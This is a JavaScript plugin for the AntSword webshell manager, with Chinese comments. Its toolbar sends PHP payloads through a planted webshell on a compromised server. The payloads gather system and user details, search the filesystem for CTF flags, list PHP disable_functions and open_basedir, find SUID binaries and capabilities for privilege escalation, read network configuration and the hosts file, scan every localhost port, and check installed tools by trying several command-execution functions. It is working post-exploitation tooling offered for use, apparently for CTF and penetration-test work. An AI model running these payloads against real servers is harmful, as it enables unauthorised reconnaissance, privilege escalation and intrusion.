'use strict';

const WIN = require('ui/window'); // 窗口库
const tabbar = require('ui/tabbar'); // Tab库
const LANG_T = antSword['language']['toastr']; // 通用通知提示

const LANG = require('./language/'); // 插件语言库
/**
 * 插件类
*/
class Plugin {
  constructor(opt) {
    /**
     * 关于 opt 数据结构详细说明见: https://doc.u0u.us/zh-hans/plugin_dev/api.html
    */
    // ######### 下方是具体插件代码,由插件作者编写 ##########

    let self = this;

    // 创建一个 window
    console.log(opt);
    let win = new WIN({
      title: `${LANG['title']}-${opt['ip']}`,
      height: 700,
      width: 700,
    });


    let default_html = `<div>
    默认页面, 点击上方 「${LANG['toolbar']['start']}」按钮即可向 shell 发出请求，获取 WEB 目录, uname 和 当前用户
</div>`;
    win.win.attachHTMLString(default_html);

    // 初始化 toolbar
    let toolbar = win.win.attachToolbar();
    toolbar.loadStruct([
      { id: 'start', type: 'button', text: LANG['toolbar']['start'], icon: 'play', }, // 开始按钮
      { id: 'reset', type: 'button', text: LANG['toolbar']['reset'], icon: 'undo', }, // 重置按钮
      { id: 'flag_search', type: 'button', text: LANG['toolbar']['flag_search'], icon: 'flag', }, // flag
      { id: 'df_ob', type: 'button', text: LANG['toolbar']['df_ob'], icon: 'check', },  // disable_functions & open_basedir
      { id: 'privilege', type: 'button', text: LANG['toolbar']['privilege'], icon: 'check', },  // 权限提升
      { id: 'ip_ports_scanner', type: 'button', text: LANG['toolbar']['ip_ports_scanner'], icon: 'wifi', },  // 网段与端口检测
      { id: 'dev_env_scanner', type: 'button', text: LANG['toolbar']['dev_env_scanner'], icon: 'wrench', },  // 开发环境检测
      { id: 'import_tools', type: 'button', text: LANG['toolbar']['import_tools'], icon: 'box', }  // 工具导入
    ]);

    // 实例化 Shell Core
    let core = new antSword['core'][opt['type']](opt);

    // 点击事件
    toolbar.attachEvent('onClick', (id) => {
      switch (id) {
        case 'start':
          // 向Shell发起请求
          core.request({
            _: self.getPayload(opt['type'])
          }).then((_ret) => { // 处理返回数据
            let results = _ret['text'].split('\t').map(item => `<p>${item}</p>`).join('');
            win.win.attachHTMLString(`${default_html}<p>${opt['url']}</p>${results}`);
            toastr.success(LANG['success'], LANG_T['success']);
          }).catch((err) => { // 处理异常数据
            toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
          });
          break;
        case 'flag_search':
          // 向Shell发起请求
          core.request({
            _: self.findflag(opt['type'])
          }).then((_ret) => { // 处理返回数据
            let results = _ret['text'].split('\n').map(item => `<br>${item}`).join('');
            win.win.attachHTMLString(`${results}`);
            toastr.success(LANG['success'], LANG_T['success']);
          }).catch((err) => { // 处理异常数据
            toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
          });
          break;
        case 'df_ob':
          // 向Shell发起请求
          core.request({
            _: self.df_ob()
          }).then((_ret) => { // 处理返回数据
            let results = _ret['text'].split('\n').map(item => `<br>${item}`).join('');
            win.win.attachHTMLString(`${results}`);
            toastr.success(LANG['success'], LANG_T['success']);
          }).catch((err) => { // 处理异常数据
            toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
          });
          break;
        case 'privilege':
          // 向Shell发起请求
          core.request({
            _: self.privilegeScan(opt['type'])
          }).then((_ret) => { // 处理返回数据
            let results = _ret['text'].split('\n').map(item => `<br>${item}`).join('');
            win.win.attachHTMLString(`${results}`);
            toastr.success(LANG['success'], LANG_T['success']);
          }).catch((err) => { // 处理异常数据
            toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
          });
          break;
        case 'ip_ports_scanner':
          // 向Shell发起请求
          core.request({
            _: self.ip_ports_scan(opt['type'])
          }).then((_ret) => { // 处理返回数据
            let results = _ret['text'].split('\n').map(item => `<br>${item}`).join('');
            win.win.attachHTMLString(`${results}`);
            toastr.success(LANG['success'], LANG_T['success']);
          }).catch((err) => { // 处理异常数据
            toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
          });
          break;
        case 'dev_env_scanner':
          // 向Shell发起请求
          core.request({
            _: self.dev_env_scan(opt['type'])
          }).then((_ret) => { // 处理返回数据
            let results = _ret['text'].split('\n').map(item => `<br>${item}`).join('');
            win.win.attachHTMLString(`${results}`);
            toastr.success(LANG['success'], LANG_T['success']);
          }).catch((err) => { // 处理异常数据
            toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
          });
          break;
        case 'import_tools':
          // 向Shell发起请求
          core.request({
            _: self.import_tools(opt['type'])
          }).then((_ret) => { // 处理返回数据
            let results = _ret['text'].split('\n').map(item => `<br>${item}`).join('');
            win.win.attachHTMLString(`${results}`);
            toastr.success(LANG['success'], LANG_T['success']);
          }).catch((err) => { // 处理异常数据
            toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
          });
          break;
        case 'reset':
          win.win.attachHTMLString(default_html);
          break;
        default:
          break;
      }
    });
    // ######### 上方是具体插件代码,由插件作者编写 ##########
  }

  // 自定义函数,用于获取不同类型的 payload
  getPayload(shelltype) {
    let codes = {
      php: `
            $D = dirname($_SERVER["SCRIPT_FILENAME"]);
            if ($D == "") {
                $D = dirname($_SERVER["PATH_TRANSLATED"]);
            }
            $R = "shell目录: ".$D . "\t";
            $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
            $s = ($u) ? $u["name"] : @get_current_user();
            $R .= "uname: ".php_uname() . "\t";
            $R .= "当前用户: ".$s;
            echo $R;
        `
    }
    return codes[shelltype];
  };
  findflag(shelltype) {
    let codes = {
      php: `$D = "疑似flag路径：". "\n";
            echo $D;
            system("find / -type f -name '*f*' -exec grep -l 'flag{' {} + 2>/dev/null");
            `
    }
    return codes[shelltype];
  };
  df_ob() {
    let code = `
    $disableFunctions = ini_get('disable_functions');
    $disableFunctionsList = $disableFunctions ? explode(',', $disableFunctions) : [];
    $openBasedir = ini_get('open_basedir');
    $openBasedirList = $openBasedir ? explode(':', $openBasedir) : [];

    echo "[disable_functions]";
    if (empty($disableFunctionsList)) {
        echo "未设置或未禁用任何函数\n";
    } else {
        echo "已禁用的函数列表:\n";
        foreach ($disableFunctionsList as $func) {
            echo "- " . trim($func) . "\n";
        }
    }

    echo "\n[open_basedir]";
    if (empty($openBasedirList)) {
        echo "未设置（无目录访问限制）\n";
    } else {
        echo "允许访问的目录:\n";
        foreach ($openBasedirList as $dir) {
            echo "- " . trim($dir) . "\n";
        }
    }
    `
    return code;
  };
  privilegeScan(shelltype) {
    let codes = {
      php: `
      $D = "SUID检测:\n";
      echo $D;
      system("find / -user root -perm -4000 -print 2>/dev/null");
      echo "\nCapabilities检测:\n";
      system("getcap -r / 2>/dev/null");
      `
    }
    return codes[shelltype];
  };
  ip_ports_scan(shelltype) {
    let codes = {
      php: `
      $isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
      function getNetworkInfo($isWindows)
      {
          $output = '';
          $commands = [
              'linux' => ['ip addr', '/sbin/ifconfig', '/sbin/ip addr'],
              'windows' => ['ipconfig /all']
          ];
          $tryCommands = $isWindows ? $commands['windows'] : array_merge($commands['linux'],['ifconfig', 'ip addr show']);

          foreach ($tryCommands as $cmd) {
              if ($result = safeExecute($cmd)) {
                  $output .= "===== [Command: $cmd] =====\n$result\n\n";
                  break;
              }
          }

          return $output ?: "所有网络命令执行失败\n";
      }

      function getHostsContent($isWindows)
      {
          $hostsPaths = [
              'linux' => '/etc/hosts',
              'windows' => 'C:\Windows\System32\\drivers\etc\hosts'
          ];
          $path = $isWindows ? $hostsPaths['windows'] : $hostsPaths['linux'];

          if (is_readable($path)) {
              return @file_get_contents($path) ?: "无法读取 hosts 文件";
          }

          if (!$isWindows) {
              return safeExecute("cat /etc/hosts") ?: "hosts 文件读取失败";
          }
          return "无法获取 hosts 文件";
      }

      function safeExecute($command)
      {
          if (!function_exists('exec')) return null; // 检查函数是否可用

          $output = [];
          @exec("$command 2>&1", $output, $returnCode);

          if ($returnCode === 0 && !empty($output)) {
              return implode("\n", $output);
          }

          return null;
      }
      echo "=== 网络配置信息 ===\n";
      echo getNetworkInfo($isWindows);
      echo "\n=== Hosts 文件内容 ===\n";
      echo getHostsContent($isWindows);
      echo "\n=== 端口扫描 ===\n";
      function checkPort($host = '127.0.0.1', $port = 80, $timeout = 2)
      {
          try {
              $socket = @fsockopen($host, $port, $errno, $errstr, $timeout);
              if ($socket) {
                  fclose($socket);
                  return true;
              }
              return "连接失败: $errstr (错误码 $errno)";
          } catch (Exception $e) {
              return "异常: " . $e->getMessage();
          }
      }
      function portScanner($start = 1, $end = 1024)
      {
          echo "开始扫描端口 $start - $end ...\n";
          for ($port = $start; $port <= $end; $port++) {
              $result = checkPort('127.0.0.1', $port, 1);
              if ($result === true) {
                  $service = getservbyport($port, "tcp"); // 获取服务名称
                  echo "[+] 端口 $port/tcp 开放" . ($service ? " ($service)" : "") . "\n";
              }
          }
      }
      portScanner(1, 65535);
      `
    }
    return codes[shelltype];
  };
  dev_env_scan(shelltype) {
    let codes = {
      php: `
      $tools = [
          'PHP' => [
              'cmd' => 'php -v',
              'parse' => function($output) { return phpversion(); }
          ],
          'cURL' => [
              'cmd' => 'curl --version',
              'parse' => function($output) {
                  return preg_match('/curl (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
              }
          ],
          'Wget' => [
              'cmd' => 'wget --version',
              'parse' => function($output) {
                  return preg_match('/GNU Wget (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
              }
          ],
          'Git' => [
              'cmd' => 'git --version',
              'parse' => function($output) {
                  return preg_match('/git version (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
              }
          ],
          'Redis' => [
              'cmd' => 'redis-cli --version',
              'parse' => function($output) {
                  return preg_match('/redis-cli (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
              }
          ],
          'Go' => [
              'cmd' => 'go version',
              'parse' => function($output) {
                  return preg_match('/go(\\d+\\.\\d+(\\.\\d+)?)/', $output, $m) ? $m[1] : null;
              }
          ],
          'MySQL' => [
              'cmd' => 'mysql --version',
              'parse' => function($output) {
                  return preg_match('/Ver (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
              }
          ],
          'Python' => [
              'cmd' => 'python3 --version || python --version',
              'parse' => function($output) {
                  return preg_match('/Python (\\d+\\.\\d+)/', $output, $m) ? $m[1] : null;
              }
          ]
      ];
      function safe_exec($cmd) {
          static $disabled;
          if (!isset($disabled)) {
              $disabled = explode(',', ini_get('disable_functions'));
          }
          
          foreach (['shell_exec', 'exec', 'passthru', 'system'] as $func) {
              if (!in_array($func, $disabled)) {
                  switch ($func) {
                      case 'shell_exec':
                          $output = @shell_exec("$cmd 2>&1");
                          return $output ? trim($output) : null;
                      case 'exec':
                          @exec("$cmd 2>&1", $output, $code);
                          return $code === 0 ? implode("\n", $output) : null;
                      case 'passthru':
                          ob_start();
                          @passthru("$cmd 2>&1", $code);
                          $output = ob_get_clean();
                          return $code === 0 ? trim($output) : null;
                      case 'system':
                          ob_start();
                          @system("$cmd 2>&1", $code);
                          $output = ob_get_clean();
                          return $code === 0 ? trim($output) : null;
                  }
              }
          }
          return null;
      }
      foreach ($tools as $name => $config) {
          $output = safe_exec($config['cmd']);
          $version = $output ? $config['parse']($output) : null;
          
          echo str_pad("$name:", 12, ' ', STR_PAD_RIGHT);
          echo $version ? "已安装 ($version)" : "未安装";
          echo "\n";
      }
      `
    }
    return codes[shelltype];
  };
  import_tools(shelltype) {
    let codes = {
      php: `
      echo "施工中..."
      `
    }

    return codes[shelltype];
  }
}

module.exports = Plugin;